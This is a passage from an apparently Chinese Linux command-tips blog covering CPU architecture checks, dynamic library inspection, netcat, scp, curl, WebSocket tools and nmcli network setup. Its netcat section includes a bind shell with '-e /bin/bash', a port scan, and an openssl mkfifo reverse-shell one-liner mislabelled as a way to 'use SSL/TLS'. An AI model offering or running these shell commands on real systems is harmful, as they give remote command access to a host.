<p>这将只显示 CPU 的架构信息，例如 x86_64（64 位）或 i686（32 位）。</p>
</li>
<li><p>使用 <code>arch</code> 命令：</p>
<p>还可以使用 <code>arch</code> 命令来获取系统的 CPU 架构信息，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">arch</span></span><br></pre></td></tr></table></figure>

<p>这将直接显示 CPU 架构。</p>
</li>
</ol>
<p>通过上述方法之一，你可以轻松地查看 Ubuntu 系统的 CPU 架构信息。</p>
<h2 id="linux-动态库-查看符号链接"><a href="#linux-动态库-查看符号链接" class="headerlink" title="linux 动态库 查看符号链接"></a>linux 动态库 查看符号链接</h2><p>在Linux系统中，你可以使用一些命令来查看动态库以及符号链接。以下是一些常用的命令：</p>
<ol>
<li><p><strong><code>ldd</code>命令</strong>：<code>ldd</code>命令用于显示一个可执行文件或共享库所依赖的动态链接库。你可以在终端中输入以下命令来使用它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd /path/to/your/executable_or_shared_library</span><br></pre></td></tr></table></figure>

<p>这将列出与给定可执行文件或共享库相关联的动态链接库。</p>
</li>
<li><p><strong><code>nm</code>命令</strong>：<code>nm</code>命令用于列出共享库或可执行文件中的符号。你可以在终端中输入以下命令来使用它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nm /path/to/your/shared_library</span><br></pre></td></tr></table></figure>

<p>如果你要查看符号链接，可以在<code>nm</code>命令后面加上<code>-D</code>选项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nm -D /path/to/your/shared_library</span><br></pre></td></tr></table></figure>

<p>这将显示共享库中的所有动态符号。</p>
</li>
<li><p><strong><code>readelf</code>命令</strong>：<code>readelf</code>命令是一个更强大的工具，用于显示ELF（可执行和链接格式）文件的信息，包括共享库和可执行文件。你可以使用以下命令来查看共享库的符号：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s /path/to/your/shared_library</span><br></pre></td></tr></table></figure>

<p>这将列出共享库中的符号表。</p>
</li>
<li><p><strong><code>objdump</code>命令</strong>：<code>objdump</code>命令也可以用来查看二进制文件的信息，包括符号。以下是一个示例命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -T /path/to/your/shared_library</span><br></pre></td></tr></table></figure>

<p>这将显示共享库中的动态符号表。</p>
</li>
</ol>
<p>要注意的是，上述命令中的路径应该替换为你实际的共享库或可执行文件的路径。</p>
<p>如果你想要查看一个符号链接所指向的实际文件，可以使用<code>ls</code>命令，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /path/to/your/symlink</span><br></pre></td></tr></table></figure>

<p>这将显示符号链接指向的实际文件路径。</p>
<h2 id="nc-使用技巧"><a href="#nc-使用技巧" class="headerlink" title="nc 使用技巧"></a>nc 使用技巧</h2><p>Netcat（<code>nc</code>）是一个非常强大且灵活的工具，可以用于各种网络连接、数据传输和调试任务。以下是一些在使用 Netcat 时的一些技巧和用法：</p>
<ol>
<li><p><strong>简单聊天：</strong><br>Netcat 可以用于在终端之间进行简单的聊天，如下所示：</p>
<p>在一台机器上启动监听模式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l &lt;port&gt;</span><br></pre></td></tr></table></figure>

<p>在另一台机器上与其进行连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;hostname&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>文件传输：</strong><br>使用 Netcat 可以在两台计算机之间传输文件。在发送端运行 <code>nc</code> 命令，而在接收端使用 <code>nc</code> 命令监听端口并保存传输的数据，如下所示：</p>
<p>发送文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -w 3 &lt;receiver_ip&gt; &lt;port&gt; &lt; file_to_send</span><br></pre></td></tr></table></figure>

<p>接收文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l &lt;port&gt; &gt; received_file</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>反向 shell：</strong><br>使用 Netcat 可以创建反向 shell 连接，允许你在远程主机上执行命令，如下所示：</p>
<p>在目标主机上启动监听模式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p &lt;port&gt; -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>在攻击机上与目标主机建立连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;target_ip&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>端口扫描：</strong><br>Netcat 可以用于进行基本的端口扫描，以检查目标主机上的哪些端口是开放的，如下所示：</p>
<p>扫描前 1000 个端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv &lt;hostname&gt; 1-1000</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>代理和端口转发：</strong><br>Netcat 可以用于创建简单的代理服务器或端口转发，如下所示：</p>
<p>创建代理服务器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p &lt;port_to_listen&gt; -c <span class="string">&quot;nc &lt;destination_host&gt; &lt;destination_port&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>端口转发：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p &lt;local_port&gt; -c <span class="string">&quot;nc &lt;destination_host&gt; &lt;destination_port&gt;&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>使用 SSL&#x2F;TLS：</strong><br>可以使用 <code>openssl</code> 命令来创建安全的加密连接，以保护数据的传输。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/ncpipe &amp;&amp; /bin/sh -i &lt; /tmp/ncpipe 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;your_ip&gt;:&lt;your_port&gt; &gt; /tmp/ncpipe; <span class="built_in">rm</span> /tmp/ncpipe</span><br></pre></td></tr></table></figure></li>
</ol>
<p>请谨慎使用 Netcat，确保你了解其功能和用途，以避免滥用或造成安全风险。不同的情况可能需要不同的选项和用法，建议在实际使用之前查阅官方文档和相关资源。</p>
<h2 id="查看ubuntu版本"><a href="#查看ubuntu版本" class="headerlink" title="查看ubuntu版本"></a>查看ubuntu版本</h2><p>您可以使用以下命令来查看 Ubuntu 系统的版本信息：</p>
<ol>
<li><p><strong>查看当前 Ubuntu 版本：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/lsb-release</span><br></pre></td></tr></table></figure>

<p>这些命令将显示当前安装的 Ubuntu 发行版的详细信息，包括发行版的代号、版本号和描述。</p>
</li>
<li><p><strong>查看内核版本：</strong><br>若要查看当前正在运行的内核版本，可以使用 <code>uname</code> 命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r</span><br></pre></td></tr></table></figure>

<p>这将显示当前正在运行的 Linux 内核的版本号。</p>
</li>
</ol>
<p>请注意，命令的输出可能包含一些其他信息，比如发行版的名称、内核的版本以及其他详细信息。确保查看相关输出，以获取您所需的确切版本信息。</p>
<h2 id="设置用户的默认目录"><a href="#设置用户的默认目录" class="headerlink" title="设置用户的默认目录"></a>设置用户的默认目录</h2><p>在Linux中，要设置用户的默认目录，可以使用用户的配置文件（通常是<code>.bashrc</code> 或 <code>.bash_profile</code>）来更改用户的起始工作目录。这将使用户在登录时进入指定的目录。</p>
<p>以下是设置用户默认目录的步骤：</p>
<ol>
<li><p><strong>确认用户存在：</strong><br>首先，请确保用户已经存在于系统中。您可以使用<code>id</code>命令来检查用户是否存在：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> &lt;username&gt;</span><br></pre></td></tr></table></figure>
<p>在这里，<code>&lt;username&gt;</code>是要检查的用户名。</p>
</li>
<li><p><strong>选择默认目录：</strong><br>选择您希望将用户设置为默认目录的目录路径。您可以选择任何现有的目录，或者您可以创建一个新的目录。</p>
</li>
<li><p><strong>编辑用户配置文件：</strong><br>对于大多数Linux发行版的bash用户，默认配置文件是 <code>.bashrc</code>。对于登录shell，如通过SSH登录的用户，也可以使用 <code>.bash_profile</code>。选择合适的配置文件来进行更改。</p>
<p>使用文本编辑器（如<code>nano</code>或<code>vim</code>）打开用户的配置文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano ~/.bash_profile</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>设置默认目录：</strong><br>在打开的配置文件中，添加以下行，将用户的默认目录设置为您选择的目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/your/default/directory</span><br></pre></td></tr></table></figure>
<p>在这里，将 <code>/path/to/your/default/directory</code> 替换为您希望作为默认目录的实际路径。</p>
</li>
<li><p><strong>保存并应用更改：</strong><br>保存文件并退出文本编辑器。</p>
</li>
<li><p><strong>重新登录：</strong><br>让更改生效，用户需要注销并重新登录。请确保用户退出当前会话并重新登录以使更改生效。</p>
</li>
<li><p><strong>验证更改：</strong><br>登录后，您可以使用以下命令来验证用户当前的工作目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<p>如果输出为您设置的默认目录路径，则表示已成功将用户的默认目录更改为您选择的目录。</p>
</li>
</ol>
<p>请注意：</p>
<ul>
<li>在更改用户的配置文件之前，建议备份文件以防止错误。</li>
<li>确保输入正确的目录路径，否则可能会导致登录问题。</li>
<li>更改用户的默认目录可能会影响其在系统中的体验，因此请谨慎进行。确保目录是用户需要经常访问的地方。</li>
</ul>
<p>如果您对更改用户默认目录不确定，或者希望用户保留默认设置，请谨慎执行以上步骤。</p>
<h2 id="将用户加入root目录"><a href="#将用户加入root目录" class="headerlink" title="将用户加入root目录"></a>将用户加入root目录</h2><p>在Linux中，root目录是文件系统的根目录，通常是表示整个文件系统的最顶层目录，标记为<code>/</code>。因为root目录是系统的根，只有超级用户（root用户）有权限直接对其进行修改。一般用户不能直接加入root目录，因为这样会破坏系统的完整性和安全性。</p>
<p>如果您的意思是将用户加入到具有root权限的用户组（通常是<code>sudo</code>组），以便普通用户可以使用<code>sudo</code>命令来临时获得超级用户权限执行某些特权操作，那么可以通过以下步骤实现：</p>
<ol>
<li><p><strong>确认sudo安装：</strong><br>确保<code>sudo</code>程序已经安装在系统中。在大多数Linux发行版中，默认情况下，<code>sudo</code>是已经安装的。</p>
</li>
<li><p><strong>确认用户存在：</strong><br>首先，请确保要将用户添加到<code>sudo</code>组的用户已经存在于系统中。您可以使用<code>id</code>命令来检查用户是否存在：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> &lt;username&gt;</span><br></pre></td></tr></table></figure>
<p>在这里，<code>&lt;username&gt;</code>是要检查的用户名。</p>
</li>
<li><p><strong>将用户添加到sudo组：</strong><br>在终端中，使用<code>usermod</code>命令来将用户添加到<code>sudo</code>组。运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG <span class="built_in">sudo</span> &lt;username&gt;</span><br></pre></td></tr></table></figure>
<p>在这里，将<code>&lt;username&gt;</code>替换为您要添加到<code>sudo</code>组的实际用户名。</p>
<p><code>-aG</code>选项用于将用户添加到附加组，以确保用户不会被从其他组中删除。</p>
</li>
<li><p><strong>验证更改：</strong><br>添加用户到<code>sudo</code>组后，他们可以使用<code>sudo</code>命令临时获得超级用户权限。</p>
<p>用户可以尝试使用<code>sudo</code>来运行某个需要root权限的命令，例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ls</span> /root</span><br></pre></td></tr></table></figure>

<p>系统将提示用户输入其自己的密码（而不是root密码），以验证他们的身份。验证通过后，用户将可以以超级用户权限执行命令。</p>
</li>
</ol>
<p>请注意：</p>
<ul>
<li>为用户授予<code>sudo</code>权限时，请确保仅为信任的用户授予该权限，以防止滥用和安全问题。</li>
<li>直接修改root目录的权限或将普通用户设置为root用户的权限是非常危险的，会导致系统完全失去安全性和稳定性。因此，不应该这样做。</li>
<li>只有需要执行特权操作时，用户才应该使用<code>sudo</code>命令。在正常情况下，应该使用普通用户权限运行大多数命令，以确保系统的安全性。</li>
</ul>
<h2 id="du-查看隐藏目录大小"><a href="#du-查看隐藏目录大小" class="headerlink" title="du 查看隐藏目录大小"></a>du 查看隐藏目录大小</h2><p>在 Linux 中，你可以使用 <code>du</code> 命令来查看隐藏目录（以<code>.</code>开头的目录）的大小。<code>du</code> 命令用于估算文件和目录的磁盘使用情况，并可以通过递归地对目录进行操作来查看目录及其子目录的大小。</p>
<p>要查看隐藏目录的大小，可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -h -d 1 /path/to/directory/.*</span><br></pre></td></tr></table></figure>

<p>其中，<code>/path/to/directory</code> 是要查看的目录所在的路径。在命令末尾的 <code>.*</code> 表示匹配以<code>.</code>开头的目录，这样就能够查看隐藏目录的大小。</p>
<p><code>-h</code> 参数用于显示人类可读的格式，以便更容易阅读文件大小，该参数将以KB、MB、GB等单位显示容器大小。<code>-d 1</code> 参数用于指定深度，表示只查看当前目录下一级的子目录大小。</p>
<p>如果你想查看所有隐藏目录的详细信息，可以加上 <code>-a</code> 参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -ah -d 1 /path/to/directory/.*</span><br></pre></td></tr></table></figure>

<p>这将列出所有隐藏目录及其大小的详细信息。</p>
<p>请注意，由于隐藏目录通常位于用户家目录或系统目录中，可能需要超级用户权限（使用 <code>sudo</code>）才能查看某些隐藏目录的大小。</p>
<h2 id="scp-指定远程端口号"><a href="#scp-指定远程端口号" class="headerlink" title="scp 指定远程端口号"></a>scp 指定远程端口号</h2><p>在 <code>scp</code> 命令中，默认使用 SSH 协议进行文件传输，SSH 协议的默认端口号是 22。如果你需要指定远程主机的不同端口号，可以使用 <code>-P</code> 参数来指定。</p>
<p>格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P &lt;port&gt; &lt;source&gt; &lt;destination&gt;</span><br></pre></td></tr></table></figure>

<p>其中，<code>&lt;port&gt;</code> 是你想要指定的远程端口号，<code>&lt;source&gt;</code> 是源文件路径，<code>&lt;destination&gt;</code> 是目标文件路径。</p>
<p>示例，假设你想将本地的 <code>example.txt</code> 文件传输到远程主机 <code>remote-host</code> 的 <code>/tmp</code> 目录，并且远程 SSH 端口号是 2222，可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 example.txt remote-host:/tmp</span><br></pre></td></tr></table></figure>

<p>这将使用 SSH 协议将 <code>example.txt</code> 文件传输到远程主机的 <code>/tmp</code> 目录，并且指定使用 SSH 端口号 2222 进行连接。</p>
<h2 id="curl-发送body数据"><a href="#curl-发送body数据" class="headerlink" title="curl 发送body数据"></a>curl 发送body数据</h2><p>在 Linux 中，可以使用 curl 命令发送包含请求体（body）数据的 HTTP 请求。以下是几种常见的方式来发送 body 数据：</p>
<ol>
<li><strong>通过命令行参数指定数据</strong>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d <span class="string">&#x27;body_data&#x27;</span> http://example.com</span><br></pre></td></tr></table></figure>

<p>在上述示例中，使用 <code>-d</code> 参数指定了请求体数据为 ‘body_data’，并使用 <code>-X POST</code> 指定了请求方法为 POST。您可以根据需要修改请求方法和请求体数据。</p>
<ol start="2">
<li><strong>通过文件指定数据</strong>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data-binary @file.txt http://example.com</span><br></pre></td></tr></table></figure>

<p>在上述示例中，使用 <code>--data-binary</code> 参数指定了要发送的文件为 file.txt，文件中的内容将作为请求体数据发送给服务器。</p>
<ol start="3">
<li><strong>通过标准输入（stdin）指定数据</strong>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;body_data&#x27;</span> | curl -X POST -d @- http://example.com</span><br></pre></td></tr></table></figure>

<p>在上述示例中，使用 <code>echo</code> 命令将数据发送到 curl 的标准输入，并通过 <code>-d @-</code> 参数告诉 curl 从标准输入中读取数据作为请求体。</p>
<p>这些是使用 curl 命令在 Linux 发送带有请求体数据的 HTTP 请求的常见方式。根据您的需求和使用场景，选择适合的方式来发送请求体数据。</p>
<p>希望这些示例对您有所帮助！如果您有更多问题，请随时提问。</p>
<h2 id="curl-建立websocket连接"><a href="#curl-建立websocket连接" class="headerlink" title="curl 建立websocket连接"></a>curl 建立websocket连接</h2><p>curl 是一个命令行工具，它主要用于发送 HTTP 请求，并不直接支持建立 WebSocket 连接。然而，您可以使用 curl 的 <code>--header</code> 选项自定义请求头来模拟 WebSocket 握手过程，从而与服务器建立一个简单的 WebSocket 连接。请注意，这种方式只适用于简单的 WebSocket 连接，不支持完整的 WebSocket 协议。</p>
<p>以下是一个示例，展示如何使用 curl 建立一个简单的 WebSocket 连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -i -N \</span><br><span class="line">  -H <span class="string">&quot;Connection: Upgrade&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Upgrade: websocket&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Sec-WebSocket-Version: 13&quot;</span> \</span><br><span class="line">  http://example.com/websocket</span><br></pre></td></tr></table></figure>

<p>在上述示例中，<code>-i</code> 选项用于输出响应头信息，<code>-N</code> 选项用于禁用数据缓冲。通过 <code>-H</code> 选项，我们自定义了多个请求头，包括 <code>Connection</code>、<code>Upgrade</code>、<code>Sec-WebSocket-Key</code> 和 <code>Sec-WebSocket-Version</code>。其中，<code>Sec-WebSocket-Key</code> 的值为 “SGVsbG8sIHdvcmxkIQ&#x3D;&#x3D;”，<code>Sec-WebSocket-Version</code> 的值为 “13”。这些请求头是模拟 WebSocket 握手过程所需的头信息。</p>
<p>需要注意的是，上述方式只是模拟了 WebSocket 握手过程，它并不能处理 WebSocket 协议的数据交换。要实现完整的 WebSocket 功能，通常需要使用专门的 WebSocket 客户端库或编程语言的 WebSocket 库来建立和处理 WebSocket 连接。</p>
<p>如果您需要使用 WebSocket 连接进行数据交换，建议使用专门的 WebSocket 客户端库，如 WebSocket++、Boost.Beast、libwebsockets 等，或使用支持 WebSocket 的编程语言库，如 JavaScript 的 WebSocket API、Python 的 websocket 模块等。</p>
<p>希望这些信息对您有所帮助！如果您有更多问题，请随时提问。</p>
<h2 id="linux-建立websocket连接的工具"><a href="#linux-建立websocket连接的工具" class="headerlink" title="linux 建立websocket连接的工具"></a>linux 建立websocket连接的工具</h2><p>在 Linux 环境下，可以使用一些特定的工具来建立 WebSocket 连接。以下是几个常用的工具：</p>
<ol>
<li><p><strong>wscat</strong>: wscat 是一个用于 WebSocket 测试和调试的命令行工具，它提供了建立 WebSocket 连接、发送和接收消息的功能。您可以使用 npm（Node Package Manager）安装 wscat：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g wscat</span><br></pre></td></tr></table></figure>

<p>安装完成后，可以使用以下命令建立 WebSocket 连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wscat -c ws://example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>websocat</strong>: websocat 是一个功能强大的命令行工具，可以用于建立 WebSocket 连接并进行数据交换。它支持 WebSocket 客户端和服务器模式，并提供了各种选项和功能。您可以从其官方网站下载并安装 websocat：<a target="_blank" rel="noopener" href="https://github.com/vi/websocat">https://github.com/vi/websocat</a></p>
<p>安装完成后，可以使用以下命令建立 WebSocket 连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websocat ws://example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>wsc</strong>: wsc 是另一个用于 WebSocket 测试和调试的命令行工具，类似于 wscat。您可以从其官方网站下载并安装 wsc：<a target="_blank" rel="noopener" href="https://github.com/danielstjules/wsc">https://github.com/danielstjules/wsc</a></p>
<p>安装完成后，可以使用以下命令建立 WebSocket 连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsc -c ws://example.com</span><br></pre></td></tr></table></figure></li>
</ol>
<p>这些工具都提供了在命令行中建立 WebSocket 连接并进行数据交换的功能。您可以根据自己的需求选择适合的工具来建立 WebSocket 连接和测试您的 WebSocket 服务器。</p>
<p>希望这些信息对您有所帮助！如果您有更多问题，请随时提问。</p>
<h2 id="nmcli-修改指定连接名"><a href="#nmcli-修改指定连接名" class="headerlink" title="nmcli 修改指定连接名"></a>nmcli 修改指定连接名</h2><p>要使用 <code>nmcli</code> 命令修改指定连接的名称，可以按照以下步骤进行操作：</p>
<ol>
<li><p>确定要修改的连接名称：首先，确定你要修改的网络连接的当前名称。你可以使用 <code>nmcli connection show</code> 命令查看所有连接的列表和详细信息。</p>
</li>
<li><p>使用 <code>nmcli connection modify</code> 命令修改连接名称：运行以下命令来修改指定连接的名称：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection modify &lt;current-connection-name&gt; connection.id &lt;new-connection-name&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;current-connection-name&gt;</code> 替换为当前连接的名称，<code>&lt;new-connection-name&gt;</code> 替换为新的连接名称。</p>
<p>例如，要将名称为 “old-name” 的连接名称修改为 “new-name”，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection modify old-name connection.id new-name</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新激活连接以使更改生效：运行以下命令以激活已修改的连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection up &lt;new-connection-name&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;new-connection-name&gt;</code> 替换为你修改后的新连接名称。</p>
</li>
</ol>
<p>完成上述步骤后，指定的连接将使用新的名称。你可以使用 <code>nmcli connection show</code> 命令来验证连接的状态和详细信息。</p>
<p>请注意，这些步骤中的修改仅针对连接的名称。如果你还需要修改其他连接配置（如 IP 地址、子网掩码、默认网关等），请参考先前提供的相关说明。</p>
<p>希望这些步骤对你有帮助！如有更多问题，请随时提问。</p>
<h2 id="nmcli-修改指定连接的ip"><a href="#nmcli-修改指定连接的ip" class="headerlink" title="nmcli 修改指定连接的ip"></a>nmcli 修改指定连接的ip</h2><p>要使用 <code>nmcli</code> 命令修改指定连接的 IP 地址，可以按照以下步骤进行操作：</p>
<ol>
<li><p>确定要修改的连接名称：首先，确定你要修改的网络连接的名称。你可以使用 <code>nmcli connection show</code> 命令查看所有连接的列表和详细信息。</p>
</li>
<li><p>使用 <code>nmcli connection modify</code> 命令修改连接配置：运行以下命令来修改指定连接的 IP 地址配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection modify &lt;connection-name&gt; ipv4.method manual ipv4.addresses &lt;ip-address&gt;/&lt;subnet-mask&gt; ipv4.gateway &lt;gateway-address&gt; ipv4.dns &lt;dns-server&gt;</span><br></pre></td></tr></table></figure>

<p>在上述命令中，将 <code>&lt;connection-name&gt;</code> 替换为要修改的连接名称，<code>&lt;ip-address&gt;</code> 替换为新的 IP 地址，<code>&lt;subnet-mask&gt;</code> 替换为新的子网掩码，<code>&lt;gateway-address&gt;</code> 替换为新的默认网关的 IP 地址，<code>&lt;dns-server&gt;</code> 替换为新的 DNS 服务器的 IP 地址。</p>
<p>例如，要将连接名称为 “eth0” 的连接配置为使用静态 IP 地址 “192.168.1.100&#x2F;24”，默认网关为 “192.168.1.1”，DNS 服务器为 “8.8.8.8”，可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection modify eth0 ipv4.method manual ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns 8.8.8.8</span><br></pre></td></tr></table></figure>
</li>
<li><p>激活连接以使更改生效：运行以下命令以激活已修改的连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmcli connection up &lt;connection-name&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;connection-name&gt;</code> 替换为你修改的连接的名称。</p>
</li>
</ol>
<p>完成上述步骤后，指定的连接将使用新的 IP 地址、子网掩码、默认网关和 DNS 服务器进行配置。你可以使用 <code>nmcli connection show</code> 命令来验证连接的状态和详细信息。</p>
<p>请注意，这些步骤假定你已经知道要使用的新的 IP 地址、子网掩码、默认网关和 DNS 服务器的正确值。确保将这些值替换为你实际使用的网络配置。</p>
<p>希望这些步骤对你有帮助！如有更多问题，请随时提问。</p>
<h2 id="NetworkManager-配置静态IP"><a href="#NetworkManager-配置静态IP" class="headerlink" title="NetworkManager 配置静态IP"></a>NetworkManager 配置静态IP</h2><p>在 Debian 系统中使用 NetworkManager 配置静态 IP 地址，可以通过以下步骤进行操作：</p>
<ol>
<li><p>确保 NetworkManager 安装和运行：首先，确保你的系统已安装 NetworkManager，并且 NetworkManager 服务正在运行。如果没有安装，你可以使用以下命令安装 NetworkManager：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install network-manager</span><br></pre></td></tr></table></figure>
</li>
<li><p>打开 NetworkManager 配置文件：使用文本编辑器打开 NetworkManager 的主要配置文件 <code>/etc/NetworkManager/NetworkManager.conf</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/NetworkManager/NetworkManager.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>确认 <code>managed</code> 选项的值：在配置文件中找到 <code>managed</code> 选项，并确保其值为 <code>true</code>。这将告诉 NetworkManager 管理所有网络接口的配置。</p>
